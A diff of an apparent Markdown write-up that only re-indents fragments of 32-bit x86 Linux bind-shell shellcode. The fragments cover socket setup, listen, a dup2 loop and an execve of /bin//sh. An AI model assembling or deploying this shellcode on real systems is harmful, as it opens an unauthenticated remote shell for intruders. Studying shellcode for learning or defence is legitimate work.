@@ -322,7 +322,7 @@ _start:
 	mov ebx, edi 
 	push 0
 	push 0
-  push word 0xb315
+  	push word 0xb315
 	push word 0x02
 
 	mov ecx, esp
@@ -332,7 +332,7 @@ _start:
 
 	; SYSCALL #3= listen()
 
-  xor eax, eax
+  	xor eax, eax
 	mov ax, 0x16b
 	mov ebx, edi
 	xor ecx, ecx
@@ -355,7 +355,7 @@ _start:
 
 	; SYSCALL #5 = dup2()
 	
-  mov cl, 0x3
+  	mov cl, 0x3
 	
 	loop_dup2:
 	xor eax, eax ; clearing out eax
@@ -368,7 +368,7 @@ _start:
 
 	; SYSCALL #6 = execve()
  
-  xor eax, eax
+  	xor eax, eax
 	push eax
 	push 0x68732f6e
 	push 0x69622f2f
@@ -379,7 +379,7 @@ _start:
 	mov ecx, esp
 	mov al, 0x0b
 
-  int 0x80
+  	int 0x80
 ```
 
 ## Resources
